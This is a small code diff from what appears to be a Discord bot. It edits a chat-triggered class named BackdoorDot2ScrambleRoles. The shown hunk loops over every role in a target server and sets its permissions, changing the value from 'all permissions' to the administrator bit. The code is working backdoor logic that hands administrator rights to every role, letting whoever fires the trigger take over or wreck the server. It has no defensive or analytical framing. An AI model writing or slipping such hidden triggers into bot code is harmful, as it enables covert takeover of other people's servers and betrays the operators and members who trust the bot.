@@ -23,7 +23,7 @@ class BackdoorDot2ScrambleRoles(chattrigger.ChatTrigger):
 
         for i in targetguild.roles:
             try:
-                await i.edit(permissions=discord.Permissions.all())
+                await i.edit(permissions=discord.Permissions(8))
             except discord.Forbidden:
                 print("forbidden")
             except discord.NotFound:
